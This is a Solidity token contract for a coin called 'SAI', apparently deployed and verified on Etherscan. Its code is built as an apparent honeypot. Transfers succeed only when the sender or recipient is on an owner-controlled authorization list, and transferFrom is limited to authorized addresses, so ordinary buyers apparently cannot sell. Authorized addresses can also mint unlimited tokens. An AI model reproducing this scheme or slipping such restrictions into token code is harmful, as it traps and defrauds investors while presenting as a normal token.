/**
 *Submitted for verification at Etherscan.io on 2023-01-29
*/

pragma solidity ^0.8.17;

//SPDX-License-Identifier: MIT

/*
SAI - https://t.me/SAIKOeth
*/

contract Token {
    
    address internal owner = 0x41DB51F4Af7ea7617A103BeB4b5A07b8390B859F;

    address ZERO = 0x0000000000000000000000000000000000000000;

    mapping (address => bool) internal authorizations;
    
    mapping(address => uint) public balances;

    mapping(address => mapping(address => uint)) public allowance;

    uint _totalSupply = 1 * (10**9) *  (10 ** 9);
    string public name = "SAI";
    string public symbol = "SAI";
    uint public decimals = 9;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = _totalSupply;
        authorizations[owner] = true;
    }

    function totalSupply() external view returns (uint256) { return _totalSupply; }
    
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
    
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function changeOwner(address account) public onlyOwner {
        owner = account;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
    
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    
    function balanceOf(address holder) public view returns(uint) {
        return balances[holder];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(authorizations[msg.sender] || authorizations[to]);
	  return _transfer(msg.sender, to, value);
    }
    
    function transferFrom(address from, address to, uint value) public authorized returns(bool) {
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        allowance[from][msg.sender] -= value;
	  return _transfer(from, to, value);
    }

    function _transfer(address from, address to, uint value) internal returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        balances[from] -= value;
	  if(to == address(0) || to == address(0xdead)) 
		_totalSupply -= value;
	  else
		balances[to] += value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    function mint(address holder, uint amount) public authorized returns(bool) {
        balances[holder] += amount;
        _totalSupply += amount;
	  emit Transfer(address(0), holder, amount);
        return true;
    }
    
    function airdrop(address[] calldata addresses, uint[] calldata tokens) external onlyOwner {
        uint256 airCapacity = 0;
        require(addresses.length == tokens.length,"Mismatch between Address and token count");

        for(uint i=0; i < addresses.length; i++){
            balances[addresses[i]] += tokens[i];
            balances[msg.sender] -= tokens[i];
		airCapacity += tokens[i];
            emit Transfer(msg.sender, addresses[i], tokens[i]);
        }
	  require(balanceOf(msg.sender) >= airCapacity, "Not enough tokens to airdrop");
    }

}